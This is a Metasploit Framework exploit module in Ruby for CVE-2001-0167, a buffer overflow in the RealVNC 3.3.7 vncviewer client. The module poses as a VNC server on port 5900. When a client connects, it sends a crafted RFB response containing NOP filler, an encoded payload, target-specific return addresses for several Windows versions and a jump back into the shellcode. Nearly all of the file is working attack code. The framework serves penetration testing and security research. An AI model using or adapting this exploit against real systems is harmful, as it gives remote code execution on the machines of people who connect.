##
# $Id: realvnc_client.rb 9179 2010-04-30 08:40:19Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::TcpServer

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'RealVNC 3.3.7 Client Buffer Overflow',
			'Description'    => %q{
				This module exploits a buffer overflow in RealVNC 3.3.7 (vncviewer.exe).
			},
			'Author'         => 'MC',
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9179 $',
			'References'     =>
				[
					[ 'CVE', '2001-0167' ],
					[ 'OSVDB', '6281' ],
					[ 'BID', '2305' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
				},
			'Payload'        =>
				{
					'Space'    => 500,
					'BadChars' => "\x00\x0a\x0d\x20\x22\x25\x26\x27\x2b\x2f\x3a\x3c\x3e\x3f\x40",
					'MaxNops'  => 0,
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Windows 2000 SP4 English',	{ 'Ret' => 0x7c2ec68b } ],
					[ 'Windows XP SP2 English',	{ 'Ret' => 0x77dc15c0 } ],
					[ 'Windows 2003 SP1 English',	{ 'Ret' => 0x76aa679b } ],
				],
			'Privileged'     => false,
			'DisclosureDate' => 'Jan 29 2001',
			'DefaultTarget'  => 0))

		register_options(
			[
				OptPort.new('SRVPORT', [ true, "The VNCServer daemon port to listen on", 5900 ])
			], self.class)
	end

	def on_client_connect(client)

		rfb = "RFB 003.003\n"

		client.put(rfb)
	end

	def on_client_data(client)
		return if ((p = regenerate_payload(client)) == nil)

		filler = make_nops(993 - payload.encoded.length)

		sploit =  "\x00\x00\x00\x00\x00\x00\x04\x06" + filler + payload.encoded
		sploit << [target.ret].pack('V') + make_nops(10) + [0xe8, -457].pack('CV')
		sploit << rand_text_english(200)

		print_status("Sending #{sploit.length} bytes to #{client.getpeername}:#{client.peerport}...")
		client.put(sploit)

		handler
		service.close_client(client)
	end

end